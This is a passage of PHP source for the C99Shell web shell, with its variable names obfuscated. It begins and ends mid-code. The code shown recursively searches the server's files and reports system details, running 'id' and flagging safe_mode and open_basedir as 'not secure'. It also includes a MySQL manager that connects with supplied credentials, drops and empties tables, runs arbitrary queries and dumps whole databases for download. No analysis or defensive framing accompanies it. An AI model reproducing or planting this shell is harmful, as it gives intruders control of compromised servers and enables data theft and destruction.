$sp3b8eaf['limit'] = array(0, $sp3b8eaf['limit'][0]); } unset($spc5ba94[$spf38c9d], $spc5ba94[$spf38c9d + 1]); } } } } else { return FALSE; } } } if (!function_exists('c99fsearch')) { function c99fsearch($sp549585) { global $sp012b41; global $sp4e77c5; global $sp14c2ea; global $spb7d4b8; global $sp01bfa9; global $sp62a453; if (substr($sp549585, -1) != DIRECTORY_SEPARATOR) { $sp549585 .= DIRECTORY_SEPARATOR; } $sp17341d = opendir($sp549585); while (($sp77bd8d = readdir($sp17341d)) !== FALSE) { if ($sp77bd8d != '.' && $sp77bd8d != '..') { $spe625df = (empty($sp62a453['name_regexp']) and strpos($sp77bd8d, $sp62a453['name']) !== FALSE) || ($sp62a453['name_regexp'] and ereg($sp62a453['name'], $sp77bd8d)); if (is_dir($sp549585 . $sp77bd8d)) { $sp01bfa9++; if (empty($sp62a453['text']) and $spe625df) { $sp012b41[] = $sp549585 . $sp77bd8d; $sp4e77c5++; } if (!is_link($sp549585 . $sp77bd8d)) { c99fsearch($sp549585 . $sp77bd8d); } } else { $spb7d4b8++; if ($spe625df) { if (!empty($sp62a453['text'])) { $sp7185b7 = @file_get_contents($sp549585 . $sp77bd8d); if ($sp62a453['text_wwo']) { $sp62a453['text'] = ' ' . trim($sp62a453['text']) . ' '; } if (!$sp62a453['text_cs']) { $sp62a453['text'] = strtolower($sp62a453['text']); $sp7185b7 = strtolower($sp7185b7); } if ($sp62a453['text_regexp']) { $spe625df = ereg($sp62a453['text'], $sp7185b7); } else { $spe625df = strpos(' ' . $sp7185b7, $sp62a453['text'], 1); } if ($sp62a453['text_not']) { $spe625df = !$spe625df; } if ($spe625df) { $sp012b41[] = $sp549585 . $sp77bd8d; $sp14c2ea++; } } else { $sp012b41[] = $sp549585 . $sp77bd8d; $sp14c2ea++; } } } } } closedir($sp17341d); } } if ($spabab30 == 'gofile') { if (is_dir($sp77bd8d)) { $spabab30 = 'ls'; $sp549585 = $sp77bd8d; } else { $spabab30 = 'f'; $sp549585 = dirname($sp77bd8d); $sp77bd8d = basename($sp77bd8d); } } @ob_start(); @ob_implicit_flush(0); function onphpshutdown() { global $sp40e72b, $spf9c77a; if (!headers_sent() and $sp40e72b and !in_array($spf9c77a, array('img', 'download', 'notepad'))) { $spc85aba = @ob_get_contents(); @ob_end_clean(); @ob_start('ob_gzHandler'); echo $spc85aba; @ob_end_flush(); } } function c99shexit() { onphpshutdown(); die; } header('Expires: Mon, 26 Jul 1997 05:00:00 GMT'); header('Last-Modified: ' . gmdate('D, d M Y H:i:s') . ' GMT'); header('Cache-Control: no-store, no-cache, must-revalidate'); header('Cache-Control: post-check=0, pre-check=0', FALSE); header('Pragma: no-cache'); if (empty($spe05b78)) { $spe05b78 = ini_get('upload_tmp_dir'); if (is_dir($spe05b78)) { $spe05b78 = '/tmp/'; } } $spe05b78 = realpath($spe05b78); $spe05b78 = str_replace('\\', DIRECTORY_SEPARATOR, $spe05b78); if (substr($spe05b78, -1) != DIRECTORY_SEPARATOR) { $spe05b78 .= DIRECTORY_SEPARATOR; } if (empty($sp265034)) { $sp265034 = $spe05b78; } else { $sp265034 = realpath($sp265034); } if (@ini_get('safe_mode') or strtolower(@ini_get('safe_mode')) == 'on') { $spa2b554 = TRUE; $sp756e29 = '<font color=red>ON (secure)</font>'; } else { $spa2b554 = FALSE; $sp756e29 = '<font color=green>OFF (not secure)</font>'; } $spc85aba = @ini_get('open_basedir'); if ($spc85aba or strtolower($spc85aba) == 'on') { $spb97757 = TRUE; $spdcfdcf = '<font color=red>' . $spc85aba . '</font>'; } else { $spb97757 = FALSE; $spdcfdcf = '<font color=green>OFF (not secure)</font>'; } $spe057bf = htmlspecialchars($spe057bf); if (empty($spe057bf)) { $spe057bf = $spc0f332; } $spe057bf[1] = strtolower($spe057bf[1]); $sp912d5c = getenv('SERVER_SOFTWARE'); if (!ereg('PHP/' . phpversion(), $sp912d5c)) { $sp912d5c .= '. PHP/' . phpversion(); } $sp912d5c = str_replace('PHP/' . phpversion(), '<a href="' . $sp4f5f94 . 'act=phpinfo" target="_blank"><b><u>PHP/' . phpversion() . '</u></b></a>', htmlspecialchars($sp912d5c)); @ini_set('highlight.bg', $spe4b9a4); @ini_set('highlight.comment', $spa931ae); @ini_set('highlight.default', $sp62f8af); @ini_set('highlight.html', $sp18ff99); @ini_set('highlight.keyword', $spd70a6d); @ini_set('highlight.string', $sp66d7d2); if (!is_array($sp788e25)) { $sp788e25 = array(); } $sp3fc037 = $spabab30 = htmlspecialchars($spabab30); $sp1f29e3 = $sp51f824 = $speba538 = null; $sp75ab22 = urlencode($sp549585); ?>
<html><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1251"><meta http-equiv="Content-Language" content="en-us"><title><?php  echo getenv('HTTP_HOST'); ?>
 - phpshell</title><STYLE>TD { FONT-SIZE: 8pt; COLOR: #ebebeb; FONT-FAMILY: verdana;}BODY { scrollbar-face-color: #800000; scrollbar-shadow-color: #101010; scrollbar-highlight-color: #101010; scrollbar-3dlight-color: #101010; scrollbar-darkshadow-color: #101010; scrollbar-track-color: #101010; scrollbar-arrow-color: #101010; font-family: Verdana;}TD.header { FONT-WEIGHT: normal; FONT-SIZE: 10pt; BACKGROUND: #7d7474; COLOR: white; FONT-FAMILY: verdana;}A { FONT-WEIGHT: normal; COLOR: #dadada; FONT-FAMILY: verdana; TEXT-DECORATION: none;}A:unknown { FONT-WEIGHT: normal; COLOR: #ffffff; FONT-FAMILY: verdana; TEXT-DECORATION: none;}A.Links { COLOR: #ffffff; TEXT-DECORATION: none;}A.Links:unknown { FONT-WEIGHT: normal; COLOR: #ffffff; TEXT-DECORATION: none;}A:hover { COLOR: #ffffff; TEXT-DECORATION: underline;}.skin0{position:absolute; width:200px; border:2px solid black; background-color:menu; font-family:Verdana; line-height:20px; cursor:default; visibility:hidden;;}.skin1{cursor: default; font: menutext; position: absolute; width: 145px; background-color: menu; border: 1 solid buttonface;visibility:hidden; border: 2 outset buttonhighlight; font-family: Verdana,Geneva, Arial; font-size: 10px; color: black;}.menuitems{padding-left:15px; padding-right:10px;;}input{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}textarea{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}button{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}select{background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}option {background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}iframe {background-color: #800000; font-size: 8pt; color: #FFFFFF; font-family: Tahoma; border: 1 solid #666666;}p {MARGIN-TOP: 0px; MARGIN-BOTTOM: 0px; LINE-HEIGHT: 150%}blockquote{ font-size: 8pt; font-family: Courier, Fixed, Arial; border : 8px solid #A9A9A9; padding: 1em; margin-top: 1em; margin-bottom: 5em; margin-right: 3em; margin-left: 4em; background-color: #B7B2B0;}body,td,th { font-family: verdana; color: #d9d9d9; font-size: 11px;}body { background-color: #000000;}</style></head><BODY text=#ffffff bottomMargin=0 bgColor=#000000 leftMargin=0 topMargin=0 rightMargin=0 marginheight=0 marginwidth=0><center><TABLE style="BORDER-COLLAPSE: collapse" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=5 width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1 bordercolor="#C0C0C0"><tr><th width="101%" height="15" nowrap bordercolor="#C0C0C0" valign="top" colspan="2"><p><font face=Webdings size=6><b>!</b></font><a href="<?php  echo $sp4f5f94; ?>
"><font face="Verdana" size="5"><b>C99Shell v. <?php  echo $sp703f1a; ?>
</b></font></a><font face=Webdings size=6><b>!</b></font></p></center></th></tr><tr><td><p align="left"><b>Software:&nbsp;<?php  echo $sp912d5c; ?>
</b>&nbsp;</p><p align="left"><b>uname -a:&nbsp;<?php  echo wordwrap(php_uname(), 90, '<br>', 1); ?>
</b>&nbsp;</p><p align="left"><b><?php  if (!$sp919bf1) { echo wordwrap(myshellexec('id'), 90, '<br>', 1); } else { echo get_current_user(); } ?>
</b>&nbsp;</p><p align="left"><b>Safe-mode:&nbsp;<?php  echo $sp756e29; ?>
</b></p><p align="left"><?php  $sp549585 = str_replace('\\', DIRECTORY_SEPARATOR, $sp549585); if (empty($sp549585)) { $sp549585 = realpath('.'); } elseif (realpath($sp549585)) { $sp549585 = realpath($sp549585); } $sp549585 = str_replace('\\', DIRECTORY_SEPARATOR, $sp549585); if (substr($sp549585, -1) != DIRECTORY_SEPARATOR) { $sp549585 .= DIRECTORY_SEPARATOR; } $sp549585 = str_replace('\\\\', '\\', $sp549585); $sp0391b3 = htmlspecialchars($sp549585); $sp40a450 = $spb6aba9 = explode(DIRECTORY_SEPARATOR, substr($sp549585, 0, -1)); $spc58e00 = 0; foreach ($sp40a450 as $sp47eda8) { $sp43d1d8 = ''; $sp02ecb4 = 0; foreach ($spb6aba9 as $sp7185b7) { $sp43d1d8 .= $sp7185b7 . DIRECTORY_SEPARATOR; if ($sp02ecb4 == $spc58e00) { break; } $sp02ecb4++; } echo '<a href="' . $sp4f5f94 . 'act=ls&d=' . urlencode($sp43d1d8) . '&sort=' . $spe057bf . '"><b>' . htmlspecialchars($sp47eda8) . DIRECTORY_SEPARATOR . '</b></a>'; $spc58e00++; } echo '&nbsp;&nbsp;&nbsp;'; if (is_writable($sp549585)) { $spe4e05b = TRUE; $sp1f8c33 = '<font color=green>[ ok ]</font>'; echo '<b><font color=green>' . view_perms(fileperms($sp549585)) . '</font></b>'; } else { $spe4e05b = FALSE; $sp1f8c33 = '<font color=red>[ Read-Only ]</font>'; echo '<b>' . view_perms_color($sp549585) . '</b>'; } if (is_callable('disk_free_space')) { $spad5c6b = disk_free_space($sp549585); $spc072e7 = disk_total_space($sp549585); if ($spad5c6b === FALSE) { $spad5c6b = 0; } if ($spc072e7 === FALSE) { $spc072e7 = 0; } if ($spad5c6b < 0) { $spad5c6b = 0; } if ($spc072e7 < 0) { $spc072e7 = 0; } $sp2472b9 = $spc072e7 - $spad5c6b; $sp24dfdf = round(100 / ($spc072e7 / $spad5c6b), 2); echo '<br><b>Free ' . view_size($spad5c6b) . ' of ' . view_size($spc072e7) . ' (' . $sp24dfdf . '%)</b>'; } echo '<br>'; $spfb92cd = ''; if ($sp919bf1) { $spc85aba = explode('\\', $sp549585); $spc85aba = $spc85aba[0]; foreach (range('a', 'z') as $spc146b4) { $spe625df = $spbcf378 = in_array($spc146b4, $spbcb200); if (!$spe625df) { $spe625df = is_dir($spc146b4 . ':\\'); } if ($spe625df) { $spfb92cd .= '<a href="' . $sp4f5f94 . 'act=ls&d=' . urlencode($spc146b4 . ':\\') . '"' . ($spbcf378 ? ' onclick="return confirm(\'Make sure that the diskette is inserted properly, otherwise an error may occur.\')"' : '') . '>[ '; if ($spc146b4 . ':' != $spc85aba) { $spfb92cd .= $spc146b4; } else { $spfb92cd .= '<font color=green>' . $spc146b4 . '</font>'; } $spfb92cd .= ' ]</a> '; } } if (!empty($spfb92cd)) { echo '<b>Detected drives</b>: ' . $spfb92cd . '<br>'; } } if (count($sp86699c) > 0) { foreach ($sp86699c as $sp9cd65e) { $sp9cd65e[1] = str_replace('%d', urlencode($sp549585), $sp9cd65e[1]); $sp9cd65e[1] = str_replace('%sort', $spe057bf, $sp9cd65e[1]); $spc85aba = realpath($sp549585 . '..'); if (empty($spc85aba)) { $sp62a453 = explode(DIRECTORY_SEPARATOR, $sp549585); unset($sp62a453[count($sp62a453) - 2]); $spc85aba = join(DIRECTORY_SEPARATOR, $sp62a453); } $sp9cd65e[1] = str_replace('%upd', urlencode($spc85aba), $sp9cd65e[1]); echo '<a href="' . $sp9cd65e[1] . '">' . $sp9cd65e[0] . '</a>&nbsp;&nbsp;&nbsp;&nbsp;'; } } echo '</p></td></tr></table><br>'; if (!empty($sp35b173) and in_array($spabab30, $spa3dc17)) { echo '<TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width="100%" valign="top">' . $sp35b173 . '</td></tr></table><br>'; } echo '<TABLE style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1><tr><td width="100%" valign="top">'; if ($spabab30 == '') { $spabab30 = $sp3fc037 = 'ls'; } if ($spabab30 == 'sql') { $spf40cb4 = $sp4f5f94 . 'act=sql'; if ($spd99509) { $spf40cb4 .= '&sql_login=' . htmlspecialchars($spd99509); } if ($sp06d945) { $spf40cb4 .= '&sql_passwd=' . htmlspecialchars($sp06d945); } if ($sp9910f1) { $spf40cb4 .= '&sql_server=' . htmlspecialchars($sp9910f1); } if ($sp32067a) { $spf40cb4 .= '&sql_port=' . htmlspecialchars($sp32067a); } if ($sp9d6962) { $spf40cb4 .= '&sql_db=' . htmlspecialchars($sp9d6962); } $spf40cb4 .= '&'; ?>
<h3>Attention! SQL-Manager is <u>NOT</u> ready module! Don't reports bugs.</h3><TABLE style="BORDER-COLLAPSE: collapse" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=5 width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1 bordercolor="#C0C0C0"><tr><td width="100%" height="1" colspan="2" valign="top"><center><?php  if ($sp9910f1) { $sp11a80a = mysql_connect($sp9910f1 . ':' . $sp32067a, $spd99509, $sp06d945); $sp1fec74 = mysql_smarterror(); @mysql_select_db($sp9d6962, $sp11a80a); if ($sp3d25fd and $sp58b8eb) { $sp51f26c = mysql_query($sp3d25fd, $sp11a80a); $sp4b9380 = mysql_smarterror(); } } else { $sp11a80a = FALSE; } echo '<b>SQL Manager:</b><br>'; if (!$sp11a80a) { if (!$sp9910f1) { echo 'NO CONNECTION'; } else { echo '<center><b>Can\'t connect</b></center>'; echo '<b>' . $sp1fec74 . '</b>'; } } else { $sp07d311 = array(); $sp07d311[] = array('Index', $sp4f5f94 . 'act=sql&sql_login=' . htmlspecialchars($spd99509) . '&sql_passwd=' . htmlspecialchars($sp06d945) . '&sql_server=' . htmlspecialchars($sp9910f1) . '&sql_port=' . htmlspecialchars($sp32067a) . '&'); $sp07d311[] = array('Query', $spf40cb4 . 'sql_act=query&sql_tbl=' . urlencode($sp0f586b)); $sp07d311[] = array('Server-status', $sp4f5f94 . 'act=sql&sql_login=' . htmlspecialchars($spd99509) . '&sql_passwd=' . htmlspecialchars($sp06d945) . '&sql_server=' . htmlspecialchars($sp9910f1) . '&sql_port=' . htmlspecialchars($sp32067a) . '&sql_act=serverstatus'); $sp07d311[] = array('Server variables', $sp4f5f94 . 'act=sql&sql_login=' . htmlspecialchars($spd99509) . '&sql_passwd=' . htmlspecialchars($sp06d945) . '&sql_server=' . htmlspecialchars($sp9910f1) . '&sql_port=' . htmlspecialchars($sp32067a) . '&sql_act=servervars'); $sp07d311[] = array('Processes', $sp4f5f94 . 'act=sql&sql_login=' . htmlspecialchars($spd99509) . '&sql_passwd=' . htmlspecialchars($sp06d945) . '&sql_server=' . htmlspecialchars($sp9910f1) . '&sql_port=' . htmlspecialchars($sp32067a) . '&sql_act=processes'); $sp07d311[] = array('Logout', $sp4f5f94 . 'act=sql'); echo '<center><b>MySQL ' . mysql_get_server_info() . ' (proto v.' . mysql_get_proto_info() . ') running in ' . htmlspecialchars($sp9910f1) . ':' . htmlspecialchars($sp32067a) . ' as ' . htmlspecialchars($spd99509) . '@' . htmlspecialchars($sp9910f1) . ' (password - "' . htmlspecialchars($sp06d945) . '")</b><br>'; if (count($sp07d311) > 0) { foreach ($sp07d311 as $sp9cd65e) { echo '[ <a href="' . $sp9cd65e[1] . '"><b>' . $sp9cd65e[0] . '</b></a> ] '; } } echo '</center>'; } echo '</td></tr><tr>'; if (!$sp11a80a) { ?>
<td width="28%" height="100" valign="top"><center><font size="5"> i </font></center><li>If login is null, login is owner of process.<li>If host is null, host is localhost</b><li>If port is null, port is 3306 (default)</td><td width="90%" height="1" valign="top"><TABLE height=1 cellSpacing=0 cellPadding=0 width="100%" border=0><tr><td>&nbsp;<b>Please, fill the form:</b><table><tr><td><b>Username</b></td><td><b>Password</b>&nbsp;</td><td><b>Database</b>&nbsp;</td></tr><form action="<?php  echo $sp4f5f94; ?>
" method="POST"><input type="hidden" name="act" value="sql"><tr><td><input type="text" name="sql_login" value="root" maxlength="64"></td><td><input type="password" name="sql_passwd" value="" maxlength="64"></td><td><input type="text" name="sql_db" value="" maxlength="64"></td></tr><tr><td><b>Host</b></td><td><b>PORT</b></td></tr><tr><td align=right><input type="text" name="sql_server" value="localhost" maxlength="64"></td><td><input type="text" name="sql_port" value="3306" maxlength="6" size="3"></td><td><input type="submit" value="Connect"></td></tr><tr><td></td></tr></form></table></td><?php  } else { if (!empty($sp9d6962)) { ?>
<td width="25%" height="100%" valign="top"><a href="<?php  echo $sp4f5f94 . 'act=sql&sql_login=' . htmlspecialchars($spd99509) . '&sql_passwd=' . htmlspecialchars($sp06d945) . '&sql_server=' . htmlspecialchars($sp9910f1) . '&sql_port=' . htmlspecialchars($sp32067a) . '&'; ?>
"><b>Home</b></a><hr size="1" noshade><?php  $sp3b8eaf = mysql_list_tables($sp9d6962); if (!$sp3b8eaf) { echo mysql_smarterror(); } else { echo '---[ <a href="' . $spf40cb4 . '&"><b>' . htmlspecialchars($sp9d6962) . '</b></a> ]---<br>'; $spa89771 = 0; while ($spfe8f01 = mysql_fetch_array($sp3b8eaf)) { $sp00c808 = mysql_query('SELECT COUNT(*) FROM ' . $spfe8f01[0]); $spa8dd51 = mysql_fetch_array($sp00c808); echo '<b>Â»&nbsp;<a href="' . $spf40cb4 . 'sql_db=' . htmlspecialchars($sp9d6962) . '&sql_tbl=' . htmlspecialchars($spfe8f01[0]) . '"><b>' . htmlspecialchars($spfe8f01[0]) . '</b></a> (' . $spa8dd51[0] . ')</br></b>'; mysql_free_result($sp00c808); $spa89771++; } if (!$spa89771) { echo 'No tables found in database.'; } } } else { ?>
<td width="1" height="100" valign="top"><a href="<?php  echo $spf40cb4; ?>
"><b>Home</b></a><hr size="1" noshade><?php  $sp3b8eaf = mysql_list_dbs($sp11a80a); if (!$sp3b8eaf) { echo mysql_smarterror(); } else { ?>
<form action="<?php  echo $sp4f5f94; ?>
"><input type="hidden" name="act" value="sql"><input type="hidden" name="sql_login" value="<?php  echo htmlspecialchars($spd99509); ?>
"><input type="hidden" name="sql_passwd" value="<?php  echo htmlspecialchars($sp06d945); ?>
"><input type="hidden" name="sql_server" value="<?php  echo htmlspecialchars($sp9910f1); ?>
"><input type="hidden" name="sql_port" value="<?php  echo htmlspecialchars($sp32067a); ?>
"><select name="sql_db"><?php  $spa89771 = 0; $sp886f96 = ''; while ($spfe8f01 = mysql_fetch_row($sp3b8eaf)) { $sp886f96 .= '<option value="' . $spfe8f01[0] . '"'; if ($sp9d6962 == $spfe8f01[0]) { $sp886f96 .= ' selected'; } $sp886f96 .= '>' . $spfe8f01[0] . '</option>'; $spa89771++; } echo '<option value="">Databases (' . $spa89771 . ')</option>'; echo $sp886f96; } ?>
</select><hr size="1" noshade>Please, select database<hr size="1" noshade><input type="submit" value="Go"></form><?php  } echo '</td><td width="100%" height="1" valign="top">'; $spa8f4f7 = TRUE; if ($sp9d6962) { if (!is_numeric($spa89771)) { $spa89771 = 0; } if ($spa89771 == 0) { $spa89771 = 'no'; } echo '<hr size="1" noshade><center><b>There are ' . $spa89771 . ' table(s) in this DB (' . htmlspecialchars($sp9d6962) . ').<br>'; if (count($spd37377) > 0) { foreach ($spbb889d as $sp9cd65e) { echo '[ <a href="' . $sp9cd65e[1] . '">' . $sp9cd65e[0] . '</a> ] '; } } echo '</b></center>'; $sp0bab45 = array('', 'dump'); if ($spea4e41 == 'tbldrop') { $sp3d25fd = 'DROP TABLE'; foreach ($spf1cb2b as $spc85aba) { $sp3d25fd .= '
`' . $spc85aba . '` ,'; } $sp3d25fd = substr($sp3d25fd, 0, -1) . ';'; $spea4e41 = 'query'; } elseif ($spea4e41 == 'tblempty') { $sp3d25fd = ''; foreach ($spf1cb2b as $spc85aba) { $sp3d25fd .= 'DELETE FROM `' . $spc85aba . '` 
'; } $spea4e41 = 'query'; } elseif ($spea4e41 == 'tbldump') { if (count($spf1cb2b) > 0) { $sp89c04e = $spf1cb2b; } elseif ($sp3f50cf) { $sp89c04e = array($sp0f586b); } $spea4e41 = 'dump'; } elseif ($spea4e41 == 'tblcheck') { $sp3d25fd = 'CHECK TABLE'; foreach ($spf1cb2b as $spc85aba) { $sp3d25fd .= '
`' . $spc85aba . '` ,'; } $sp3d25fd = substr($sp3d25fd, 0, -1) . ';'; $spea4e41 = 'query'; } elseif ($spea4e41 == 'tbloptimize') { $sp3d25fd = 'OPTIMIZE TABLE'; foreach ($spf1cb2b as $spc85aba) { $sp3d25fd .= '
`' . $spc85aba . '` ,'; } $sp3d25fd = substr($sp3d25fd, 0, -1) . ';'; $spea4e41 = 'query'; } elseif ($spea4e41 == 'tblrepair') { $sp3d25fd = 'REPAIR TABLE'; foreach ($spf1cb2b as $spc85aba) { $sp3d25fd .= '
`' . $spc85aba . '` ,'; } $sp3d25fd = substr($sp3d25fd, 0, -1) . ';'; $spea4e41 = 'query'; } elseif ($spea4e41 == 'tblanalyze') { $sp3d25fd = 'ANALYZE TABLE'; foreach ($spf1cb2b as $spc85aba) { $sp3d25fd .= '
`' . $spc85aba . '` ,'; } $sp3d25fd = substr($sp3d25fd, 0, -1) . ';'; $spea4e41 = 'query'; } elseif ($spea4e41 == 'deleterow') { $sp3d25fd = ''; if (!empty($sp85804c)) { $sp3d25fd = 'DELETE * FROM `' . $sp0f586b . '`;'; } else { foreach ($spac6d00 as $spc85aba) { $sp3d25fd .= 'DELETE * FROM `' . $sp0f586b . '` WHERE' . $spc85aba . ' LIMIT 1;
'; } $sp3d25fd = substr($sp3d25fd, 0, -1); } $spea4e41 = 'query'; } elseif ($sp5c3fc7 == 'insert') { if ($sp0267a1 == 1) { $spd31430 = ''; $sp02dde2 = array_keys($spb8ee3f); foreach ($sp02dde2 as $spc85aba) { $spd31430 .= '`' . addslashes($spc85aba) . '`, '; } if (!empty($spd31430)) { $spd31430 = substr($spd31430, 0, strlen($spd31430) - 2); } $sp843422 = ''; $spc58e00 = 0; foreach (array_values($spb8ee3f) as $spc85aba) { if ($spad609a = $spc7f8a6[$sp02dde2[$spc58e00]]) { $sp843422 .= $spad609a . ' ('; } $sp843422 .= '\'' . addslashes($spc85aba) . '\''; if ($spad609a) { $sp843422 .= ')'; } $sp843422 .= ', '; $spc58e00++; } if (!empty($sp843422)) { $sp843422 = substr($sp843422, 0, strlen($sp843422) - 2); } $sp3d25fd = 'INSERT INTO `' . $sp0f586b . '` ( ' . $spd31430 . ' ) VALUES ( ' . $sp843422 . ' );'; $spea4e41 = 'query'; $sp5c3fc7 = 'browse'; } elseif ($sp0267a1 == 2) { $sp4a009d = mysql_buildwhere($spb8ee3f, ', ', $spc7f8a6); $sp3d25fd = 'UPDATE `' . $sp0f586b . '` SET ' . $sp4a009d . ' WHERE ' . $spcf5650 . ' LIMIT 1;'; $sp3b8eaf = mysql_query($sp3d25fd) or print mysql_smarterror(); $sp3b8eaf = mysql_fetch_array($sp3b8eaf, MYSQL_ASSOC); $spea4e41 = 'query'; $sp5c3fc7 = 'browse'; } } if ($spea4e41 == 'query') { echo '<hr size="1" noshade>'; if ($sp58b8eb and !$sp51f26c and $spf4bc54) { if (!$sp4b9380) { $sp4b9380 = 'Query was empty'; } echo '<b>Error:</b> <br>' . $sp4b9380 . '<br>'; } if ($sp51f26c or !$spf4bc54) { $spea4e41 = $spe2a3c1; } if (!$sp58b8eb or $spea4e41) { echo '<table border="0" width="100%" height="1"><tr><td><form action="' . $spf40cb4 . '" method="POST"><b>'; if ($sp3d25fd and !$sp58b8eb) { echo 'Do you really want to:'; } else { echo 'SQL-Query :'; } echo '</b><br><br><textarea name="sql_query" cols="100" rows="10">' . htmlspecialchars($sp3d25fd) . '</textarea><br><br><input type="hidden" name="sql_act" value="query"><input type="hidden" name="sql_tbl" value="' . htmlspecialchars($sp0f586b) . '"><input type="hidden" name="submit" value="1"><input type="hidden" name="sql_goto" value="' . htmlspecialchars($spe2a3c1) . '"><input type="submit" name="sql_confirm" value="Yes">&nbsp;<input type="submit" value="No"></form></td></tr></table>'; } } if (in_array($spea4e41, $sp0bab45)) { ?>
<table border="0" width="100%" height="1"><tr><td width="30%" height="1"><b>Create new table:</b><form action="<?php  echo $sp4f5f94; ?>
"><input type="hidden" name="act" value="sql"><input type="hidden" name="sql_act" value="newtbl"><input type="hidden" name="sql_db" value="<?php  echo htmlspecialchars($sp9d6962); ?>
"><input type="hidden" name="sql_login" value="<?php  echo htmlspecialchars($spd99509); ?>
"><input type="hidden" name="sql_passwd" value="<?php  echo htmlspecialchars($sp06d945); ?>
"><input type="hidden" name="sql_server" value="<?php  echo htmlspecialchars($sp9910f1); ?>
"><input type="hidden" name="sql_port" value="<?php  echo htmlspecialchars($sp32067a); ?>
"><input type="text" name="sql_newtbl" size="20">&nbsp;<input type="submit" value="Create"></form></td><td width="30%" height="1"><b>Dump DB:</b><form action="<?php  echo $sp4f5f94; ?>
"><input type="hidden" name="act" value="sql"><input type="hidden" name="sql_act" value="dump"><input type="hidden" name="sql_db" value="<?php  echo htmlspecialchars($sp9d6962); ?>
"><input type="hidden" name="sql_login" value="<?php  echo htmlspecialchars($spd99509); ?>
"><input type="hidden" name="sql_passwd" value="<?php  echo htmlspecialchars($sp06d945); ?>
"><input type="hidden" name="sql_server" value="<?php  echo htmlspecialchars($sp9910f1); ?>
"><input type="hidden" name="sql_port" value="<?php  echo htmlspecialchars($sp32067a); ?>
"><input type="text" name="dump_file" size="30" value="<?php  echo 'dump_' . getenv('SERVER_NAME') . '_' . $sp9d6962 . '_' . date('d-m-Y-H-i-s') . '.sql'; ?>
">&nbsp;<input type="submit" name=\"submit\" value="Dump"></form></td><td width="30%" height="1"></td></tr><tr><td width="30%" height="1"></td><td width="30%" height="1"></td><td width="30%" height="1"></td></tr></table><?php  if (!empty($spea4e41)) { echo '<hr size="1" noshade>'; } if ($spea4e41 == 'newtbl') { echo '<b>'; if (mysql_create_db($sp0fc141) and !empty($sp0fc141)) { echo 'DB "' . htmlspecialchars($sp0fc141) . '" has been created with success!</b><br>'; } else { echo 'Can\'t create DB "' . htmlspecialchars($sp0fc141) . '".<br>Reason:</b> ' . mysql_smarterror(); } } elseif ($spea4e41 == 'dump') { if (empty($sp58b8eb)) { $spa8f4f7 = FALSE; echo '<form method="GET"><input type="hidden" name="act" value="sql"><input type="hidden" name="sql_act" value="dump"><input type="hidden" name="sql_db" value="' . htmlspecialchars($sp9d6962) . '"><input type="hidden" name="sql_login" value="' . htmlspecialchars($spd99509) . '"><input type="hidden" name="sql_passwd" value="' . htmlspecialchars($sp06d945) . '"><input type="hidden" name="sql_server" value="' . htmlspecialchars($sp9910f1) . '"><input type="hidden" name="sql_port" value="' . htmlspecialchars($sp32067a) . '"><input type="hidden" name="sql_tbl" value="' . htmlspecialchars($sp0f586b) . '"><b>SQL-Dump:</b><br><br>'; echo '<b>DB:</b>&nbsp;<input type="text" name="sql_db" value="' . urlencode($sp9d6962) . '"><br><br>'; $spc85aba = join(';', $sp89c04e); echo '<b>Only tables (explode ";")&nbsp;<b><sup>1</sup></b>:</b>&nbsp;<input type="text" name="dmptbls" value="' . htmlspecialchars($spc85aba) . '" size="' . (strlen($spc85aba) + 5) . '"><br><br>'; if ($sp5b1be2) { $sp13d1b2 = $sp5b1be2; } else { $sp13d1b2 = htmlspecialchars('./dump_' . getenv('SERVER_NAME') . '_' . $sp9d6962 . '_' . date('d-m-Y-H-i-s') . '.sql'); } echo '<b>File:</b>&nbsp;<input type="text" name="sql_dump_file" value="' . $sp13d1b2 . '" size="' . (strlen($sp13d1b2) + strlen($sp13d1b2) % 30) . '"><br><br>'; echo '<b>Download: </b>&nbsp;<input type="checkbox" name="sql_dump_download" value="1" checked><br><br>'; echo '<b>Save to file: </b>&nbsp;<input type="checkbox" name="sql_dump_savetofile" value="1" checked>'; echo '<br><br><input type="submit" name="submit" value="Dump"><br><br><b><sup>1</sup></b> - all, if empty'; echo '</form>'; } else { $spa8f4f7 = TRUE; $sp4a009d = array(); $sp4a009d['sock'] = $sp11a80a; $sp4a009d['db'] = $sp9d6962; $spa7b209 = 'download'; $sp4a009d['print'] = 0; $sp4a009d['nl2br'] = 0; $sp4a009d[''] = 0; $sp4a009d['file'] = $sp5b1be2; $sp4a009d['add_drop'] = TRUE; $sp4a009d['onlytabs'] = array(); if (!empty($sp89c04e)) { $sp4a009d['onlytabs'] = explode(';', $sp89c04e); } $sp6ec051 = mysql_dump($sp4a009d); if ($spd0f3e9) { @ob_clean(); header('Content-type: application/octet-stream'); header('Content-length: ' . strlen($sp6ec051)); header('Content-disposition: attachment; filename="' . basename($sp9393b1) . '";'); echo $sp6ec051; die; } elseif ($sp5dac90) { $spe2e680 = fopen($sp9393b1, 'w'); if (!$spe2e680) { echo '<b>Dump error! Can\'t write to "' . htmlspecialchars($sp9393b1) . '"!'; } else { fwrite($spe2e680, $sp6ec051); fclose($spe2e680); echo '<b>Dumped! Dump has been writed to "' . htmlspecialchars(realpath($sp9393b1)) . '" (' . view_size(filesize($sp9393b1)) . ')</b>.'; } } else { echo '<b>Dump: nothing to do!</b>'; } } } if ($spa8f4f7) { if (!empty($sp0f586b)) { if (empty($sp5c3fc7)) { $sp5c3fc7 = 'browse'; } $sp00c808 = mysql_query('SELECT COUNT(*) FROM `' . $sp0f586b . '`;'); 